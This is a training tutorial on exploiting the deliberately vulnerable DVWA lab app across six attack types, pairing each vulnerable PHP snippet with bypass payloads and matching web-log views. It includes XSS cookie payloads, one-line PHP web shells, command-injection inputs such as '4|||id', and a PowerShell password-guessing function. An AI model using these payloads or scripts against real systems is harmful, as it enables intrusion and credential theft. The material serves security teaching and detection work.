# Exploring Web Application Attacks Using DVWA

The Damn Vulnerable Web Application was designed to aid security professionals
explore and understand web attacks, basic security controls that can be
implemented, and the impact of these attacks when successful.

This training document will review the following:

- [DVWA Setup](#dvwa-setup)
- [File Inclusion](#file-inclusion)
- [XSS Reflected](#xss-reflected)
- [XSS Stored](#xss-stored)
- [Command Injection](#command-injection)
- [File Upload](#file-upload)
- [Brute Force](#brute-force)

<br>

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/putin.png)<br><br>


## DWVA Setup

The DWVA is the Damn Vulnerable Web Application and is [available as a Docker
image](https://github.com/infoslack/docker-dvwa).  To run a container locally, use:

```
docker pull dvwa
docker run -d -p 80:80 infoslack/dvwa
```

<br>

To run a container in the cloud, use:

```
# save the running container
docker commit <container ID> gcr.io/<project>/<image>:<tag>`

OR

# tag the image
docker tag <image> gcr.io/<project>/<image>:<tag>
```

<br>

Then, push the image to the remote registry as you normally would using `docker`:

```
docker push gcr.io/<project>/<image>:<tag>
```

<br>

Now list images in the GCP repository to ensure it's been uploaded:

```
gcloud container images list
```

<br>

You must enable the Kubernetes API and set the default compute zone first:

Enable Kubernetes API:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image104.png)<br><br>


```
gcloud config set compute/zone us-central1-a
```

<br>

After that, you can run a DVWA container with the image:

```
# Create a cluster
gcloud container clusters create <cluster-name>
gcloud container clusters get-credentials <cluster-name>

# Deploy a container in the cluster
kubectl create deployment <deployment-name> --image=<image-name>

# Expose the ports needed
kubectl expose deployment <deployment-name> --type LoadBalancer --port <external-port> --target-port <container-port>

# Verify service and pods
kubectl get pods
kubectl get service <deployment-name>
```

<br>

To stop and start, use:

```
# Stop cluster
gcloud container clusters resize dvwa --num-nodes=0 --zone=us-central1-a

# Start cluster
gcloud container clusters resize dvwa --num-nodes=3 --zone=us-central1-a
```

<br>

When you want to delete, use:

```
kubectl delete service hello-server
gcloud container clusters delete cluster-name
```

<br>

After a few minutes, you'll be able to see the address and port where the DVWA
container can be reached:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image102.png)<br><br>

On your first visit you'll be redirected to the setup page where you need to
create the database:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image100.png)<br><br>

Now you're ready to go.  Log in with `admin:password`:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image101.png)<br><br>

DWVA has four different security levels: Low, Medium, High, and Impossible.  Each
level has different protection mechanisms enabled including:

- File upload restrictions
- Character restrictions
- Regular expression restrictions
- File extension restrictions

Let's look at low, medium, and high levels for the following:

- [File Inclusion](#file-inclusion)
- [XSS Reflected](#xss-reflected)
- [XSS Stored](#xss-stored)
- [Command Injection](#command-injection)
- [File Upload](#file-upload)
- [Brute Force](#brute-force)

<br>

## File Inclusion

This technique modifies a parameter in order to trick the web application into
retrieving and rendering local and remote files.  This can be used to view files
containing sensitive data or to execute code.

- [File Inclusion - Low Security](#file-inclusion---low-security)
- [File Inclusion - Medium Security](#file-inclusion---medium-security)
- [File Inclusion - High Security](#file-inclusion---high-security)

<br>

### File Inclusion - Low Security  

The low security level simply loads whatever filepath is passed in the `page`
parameter of the GET request:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image103.png)<br><br>

```php
$file = $_GET[ 'page' ];
```

<br>

This allows us to perform local file inclusion:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image001.png)<br><br>

As well as remote file inclusion which downloads a file and executes any PHP code
it may contain.  In this case it is a file called `page.php` which contains the
single line of PHP code `<?php system(whoami);?>`:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image002.png)<br><br>

Here is what these requests look like in web logs:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image003.png)<br><br>


### File Inclusion - Medium Security

The medium security level provides character restrictions intended to prevent
remote file inclusion and directory traversal:

```php
$file = $_GET[ 'page' ];
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );
```

<br>


This can be bypassed using url-encoded values:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image004.png)<br><br>

Here is what these requests look like in web logs:

```
index=proxy cs_host=unioncentralorchids.com | regex url="page=" | table _time url
```

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image005.png)<br><br>


### File Inclusion - High Security

The high security level uses filename matching (`fnmatch()`) to prevent the
attack:

```php
$file = $_GET[ 'page' ];
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    echo "ERROR: File not found!";
    exit;
}
```

<br>

This can be bypassed by changing the name of the `page.php` file to `file.php`:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image006.png)<br><br>

Here is what these requests look like in web logs:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image007.png)<br><br>

## XSS Reflected

Cross Site Scripting (XSS) occurs when an attacker is able to cause a victim's
browser to execute arbitrary JavaScript in the context of a legitimate website.
JavaScript code can be injected into the browser and run to access cookies,
tokens, geolocation coordinates, webcam data, and other sensitive information.

Reflected XSS is performed by coaxing a victim to click on a link to a legitimate
site that is vulnerable to XSS.  The link contains malicious JS code that when
visited, will be reflected back to the browser and executed as if it originated
from the legitimate website.

- [XSS Reflected - Low Security](#xss-reflected---low-security)
- [XSS Reflected - Medium Security](#xss-reflected---medium-security)
- [XSS Reflected - High Security](#xss-reflected---high-security)

<br>

### XSS Reflected - Low Security

Here the PHP code checks to see if the `name` parameter contains a value and that
it is not empty, then uses it to build a text string that will be displayed on
the screen:

```php
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}
```

<br>

So if a link is created that sets the `name` parameter to `<script>alert(document.cookie)</script>`,
this string of code will be printed to the page and executed by the user's
browser:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image008.png)<br><br>

Here is what these requests look like in web logs:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image009.png)<br><br>


### XSS Reflected - Medium Security

The medium security level utilizes string replacements to get rid of any script
tags that may be in the `name` parameter:

```php
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );
    echo "<pre>Hello ${name}</pre>";
}
```

<br>

This can be bypassed by using junk tags which we expect to be stripped, leaving
the payload we want to execute:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image010.png)<br><br>

Here is what these requests look like in web logs:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image011.png)<br><br>


### XSS Reflected - High Security

The high security level uses regular expressions to remove any characters placed
in between the string `<script>`:

```php
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
    echo "<pre>Hello ${name}</pre>";
}
```

<br>

This can be bypassed using a different tag such as `<svg onload=alert(document.cookie)>`:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image012.png)<br><br>

Here is what these requests look like in web logs:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image013.png)<br><br>


## XSS Stored

Also called Persistent Cross Site Scripting, Stored XSS actually changes the
website's content so that any user that visits will load and run the JavaScript
in their browser.  This is commonly accomplished by adding a line of code into
a blog comment or user profile but can be done with any part of a website that
users have the ability to modify or write to.

- [XSS Stored - Low Security](#xss-stored---low-security)
- [XSS Stored - Medium Security](#xss-stored---medium-security)
- [XSS Stored - High Security](#xss-stored---high-security)

<br>

### XSS Stored - Low Security  

The low security level does not sanitize the data submitted by the user and
places the values directly in the database and they are displayed on every page visit:

```php
if( isset( $_POST[ 'btnSign' ] ) ) {

    $message  = trim( $_POST[ 'mtxMessage' ] );
    $name     = trim( $_POST[ 'txtName' ] );
    $message  = stripslashes( $message );
    $message  = mysql_real_escape_string( $message );
    $name     = mysql_real_escape_string( $name );
    $query    = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result   = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );
    mysql_close();
}
```

<br>

When code is submitted as a value, it is written to the page and is executed by
the user's browser every time it is visited.  Here, the message posted by jim
contains the code `<script>alert(1)</script>`:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image014.png)<br><br>

Here is what these requests look like in web logs:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image015.png)<br><br>


### XSS Stored - Medium Security

The medium security uses `addslashes` to escape single quotes, double quotes,
backslashes, and NULL bytes in the message value. The `strip_tags` function then
removes any HTML and PHP tags while the `htmlspecialchars` function converts
any special characters back to their HTML entities.

The `name` value gets string replacements to remove any script tags that are
included:

```php

if( isset( $_POST[ 'btnSign' ] ) ) {

    $message   = trim( $_POST[ 'mtxMessage' ] );
    $name      = trim( $_POST[ 'txtName' ] );
    $message   = strip_tags( addslashes( $message ) );
    $message   = mysql_real_escape_string( $message );
    $message   = htmlspecialchars( $message );
    $name      = str_replace( '<script>', '', $name );
    $name      = mysql_real_escape_string( $name );
    $query     = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result    = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );
}
```

<br>

This can be bypassed using a script tag with camel characters in the `name` field.  
We'll need to use Burp Suite to catch the POST request and inject JS code into
the `name` field:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image016.png)<br><br>

Now when the page is visited, the JS code written to the page executes in the
browser:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image017.png)<br><br>


### XSS Stored - High Security

The high security level adds regular expressions to remove any junk characters
from the `name` value if it contains the string `<script>`.

```php
if( isset( $_POST[ 'btnSign' ] ) ) {

    $message   = trim( $_POST[ 'mtxMessage' ] );
    $name      = trim( $_POST[ 'txtName' ] );
    $message   = strip_tags( addslashes( $message ) );
    $message   = mysql_real_escape_string( $message );
    $message   = htmlspecialchars( $message );
    $name      = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
    $name      = mysql_real_escape_string( $name );
    $query     = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result    = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );
}
```

<br>

This can be bypassed using `<img src=x onerror=alert(document.cookie)>`:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image018.png)<br><br>

Here is what these requests look like in web logs:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image019.png)<br><br>


## Command Injection

Command injection occurs when an actor is able to submit arbitrary commands as
part of user input that get executed by the application.

- [Command Injection - Low Security](#command-injection---low-security)
- [Command Injection - Medium Security](#command-injection---medium-security)
- [Command Injection - High Security](#command-injection---high-security)

<br>

### Command Injection - Low Security

The low security setting passes the `ip` parameter from the request directly to
the `shell_exec()` function:  

```php
if( isset( $_POST[ 'Submit' ]  ) ) {
    $target = $_REQUEST[ 'ip' ];
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }
    echo "<pre>{$cmd}</pre>";
}
```

<br>

This can be exploited by adding `&` after the `ping` command in order to execute
our own command:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image020.png)<br><br>

Since the payload is delivered in a POST request, here is what these requests
look like in web logs:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image021.png)<br><br>


### Command Injection - Medium Security

The medium security level attempts to prevent this by removing the `&&` and `;`
characters, both used in Windows systems to append commands:

```php
if( isset( $_POST[ 'Submit' ]  ) ) {
    $target = $_REQUEST[ 'ip' ];
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );

    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    echo "<pre>{$cmd}</pre>";
}
```

<br>

The previous technique works and we can submit `4&ls /tmp` to list the contents
of the `/tmp` directory on the docker container:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image022.png)<br><br>

### Command Injection - High Security

The high security setting removes nine different characters from the value of the
`ip` parameter before passing it to the `shell_exec()` function:

```php
if( isset( $_POST[ 'Submit' ]  ) ) {

    $target = trim($_REQUEST[ 'ip' ]);
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );

    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }
    echo "<pre>{$cmd}</pre>";
}
```

<br>

This can be bypassed using `4|||id` as one of the pipes is correctly stripped
leaving the double pipes which allows the `id` command to execute:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image024.png)<br><br>

Again, since the payloads are passed in a POST request, there is not much to see
in the web logs:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image025.png)<br><br>



## File Upload

A file upload vulnerability allows a user to write arbitrary files to the server,
usually in the form of a web shell providing the ability to run system
commands on the server.

- [File Upload - Low Security](#file-upload---low-security)
- [File Upload - Medium Security](#file-upload---medium-security)
- [File Upload - High Security](#file-upload---high-security)

<br>

### File Upload - Low Security  

In low security mode, the code takes the uploaded file and moves it directly
to the `hackable/uploads` directory without any checks:

```php
if( isset( $_POST[ 'Upload' ] ) ) {

    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}
```

<br>

This can be exploited by uploading a file containing one line of PHP code:
`<?php system(ifconfig) ?>`

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image026.png)<br><br>

Now when the page is visited, the PHP code runs and prints the results of the
`ifconfig` command:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image027.png)

Here is what these requests look like in web logs:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image028.png)<br><br>

### File Upload - Medium Security

The medium security settings check to see that the file type is either a `image/jpeg`
or a `image/png` before writing it to the `uploads` directory:

```php
if( isset( $_POST[ 'Upload' ] ) ) {

    $target_path   = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path  .= basename( $_FILES[ 'uploaded' ][ 'name' ] );
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
        ( $uploaded_size < 100000 ) ) {
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}
```

<br>

This can be bypassed by changing the file type in the request.  Catch the POST
request with Burp Suite and change the content type to `image/png`.  This time we'll
use the `shell.php` file which executes commands in using the `cmd` parameter:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image029.png)<br><br>

Now arbitrary commands can be run with `shell.php`:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image030.png)<br><br>

Since these are GET requests, you can see the commands being run in the proxy logs:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image180.png)<br><br>


### File Upload - High Security

The high security level checks to make sure the file extension is either `.jpg`,
`.jpeg`, or `.png` and that the size of the file is less than 100 KB:

```php
if( isset( $_POST[ 'Upload' ] ) ) {

    $target_path   = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path  .= basename( $_FILES[ 'uploaded' ][ 'name' ] );
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) && ( $uploaded_size < 100000 ) && getimagesize( $uploaded_tmp ) ) {
        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            echo "<pre>{$target_path} successfully uploaded!</pre>";
        }
    }
    else {
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}
```

<br>

First we need to start with an actual image file that will meet all the checks
in place designed to ensure an image file is being submitted:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image130.png)<br><br>

We can then inject some PHP code into the file's metadata using `exiftool`.  This
time we'll use `phpinfo()` which returns information about the server and environment:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image131.png)<br><br>

Check to make sure the PHP code executes when the file is evaluated by PHP:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image132.png)<br><br>

Once uploaded, the image can be viewed in the `hackable/uploads` directory as an
image:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image133.png)<br><br>

This level requires the use of another vulnerability to change the filename back
to a `.php` extension so that the server will run the PHP code.  We can
do this with command injection for example:

```bash
4;mv /app/hackable/uploads/rygel.jpg /app/hackable/uploads/rygel.php
```

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image134.png)<br><br>

Now when the renamed page is visited, the server executes the PHP code contained in the file:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image135.png)<br><br>

In the proxy logs, it just looks like the image is being visited:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image136.png)<br><br>


## Brute Force

A brute force password attack tries every possible combination of letters, numbers,
and special characters until the correct password is found.  A more realistic
attack is to use either a custom or well-know password dictionary which we'll
simulate here.

- [Brute Force - Low Security](#brute-force---low-security)
- [Brute Force - Medium Security](#brute-force---medium-security)
- [Brute Force - High Security](#brute-force---high-security)

<br>

### Brute Force - Low Security  

The low security level checks the provided username and password against the
database and if a match, provides a welcome message:

```php
if( isset( $_GET[ 'Login' ] ) ) {

    $user   = $_GET[ 'username' ];
    $pass   = $_GET[ 'password' ];
    $pass   = md5( $pass );
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );

    if( $result && mysql_num_rows( $result ) == 1 ) {
        $avatar = mysql_result( $result, 0, "avatar" );
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    mysql_close();
}

```

<br>

This can be exploited by running a password guessing tool with a password list
that contains the correct password.  To demonstrate we'll use a simple PowerShell
function named `GuessPass`:

```powershell
function GuessPass {
    $list = @('12345678','abcdefgh','anywords','forever1','fantastic','superman','gosaints','tennineeight','sevensix','baseball','W0W$ers!!','p@ssword','p@$$W0rd','123478901234','whatever','123456','whattheheck','extracool','whoanowwhoa','getsomebruh','okiedokie','notthatspicy','$uper$ecret','barbeque1','rogerdodger')

    $list | %{
        $url = "http://unioncentralorchids.com:39560/vulnerabilities/brute/?username=admin&password=$_&Login=Login"

        $wc = New-Object Net.WebClient
        $wc.Headers['User-Agent']  = "<user-agent>"
        $wc.Headers['Cookie']      = "PHPSESSID=0gbg1r07eetum8lr94mv0ocf63; security=low"

        if ($wc.DownloadString($url).Contains("incorrect")) {
            Write-Host -Fore Gray "[-] Failed with password $_"
        }
        else {
            Write-Host -Fore Green "[!] Password Found: $_"
            Break
        }
    }
}
```

<br>

When the function runs, the password is quickly identified:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image039.png)<br><br>

Here is what these requests look like in web logs:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image040.png)<br><br>

### Brute Force - Medium Security

The medium security level attempts to slow down password guessing tools by adding
the `sleep()` command after each unsuccessful attempt:

```php
if( isset( $_GET[ 'Login' ] ) ) {

    $user   = $_GET[ 'username' ];
    $user   = mysql_real_escape_string( $user );
    $pass   = $_GET[ 'password' ];
    $pass   = mysql_real_escape_string( $pass );
    $pass   = md5( $pass );
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );

    if( $result && mysql_num_rows( $result ) == 1 ) {
        $avatar = mysql_result( $result, 0, "avatar" );
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        sleep( 2 );
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }
    mysql_close();
}
```

<br>

This added control only increases the time needed to complete the attack and
can be bypassed by setting a wait time on the tool being used:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image041.png)<br><br>


### Brute Force - High Security

The high security level adds an Anti-CSRF token as well as a random time delay
between 0 and 4 seconds.  Each request must pass the `checkToken()` function
before the username and password are checked against the database:

```php
if( isset( $_GET[ 'Login' ] ) ) {

    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
    $user   = $_GET[ 'username' ];
    $user   = stripslashes( $user );
    $user   = mysql_real_escape_string( $user );
    $pass   = $_GET[ 'password' ];
    $pass   = stripslashes( $pass );
    $pass   = mysql_real_escape_string( $pass );
    $pass   = md5( $pass );
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );

    if( $result && mysql_num_rows( $result ) == 1 ) {
        $avatar = mysql_result( $result, 0, "avatar" );
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        sleep( rand( 0, 3 ) );
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }
    mysql_close();
}
```

<br>

This can be bypassed by adding code that visits the `brute` page first, obtains
the token, and includes it in every password guess request.  Also the sleep time
is adjusted:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image043.png)<br><br>

The function runs same as before, but with a guess every 4 seconds:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image039.png)<br><br>

Here is what these requests look like in web logs:

![](images/Exploring%20Web%20Application%20Attacks%20Using%20DVWA/image042.png)<br><br>


## Summary

Modern browsers contain many different features that are designed to enhance user
experience including embedded content, dynamic scripting, and AJAX calls. All of
these features increase the attack surface of browsers as they can potentially be
used to run untrusted code or social engineer the user into performing unwanted
actions.

Being able to examine the structure and purpose of a malicious webpage is essential
for accurate analysis and reporting. Become familiar with some of the ways JavaScript
can be used to hijack an account, induce an action, or run code that's hidden from
the user. Chrome's DevTools is a great way to do this and FireFox and IE also have
debuggers with similar capabilities.

Training labs are a learning tool that can increase your understanding of adversary
approaches and attacks. Emulation and practical application improves your ability
to correctly identify and address them during an incident.
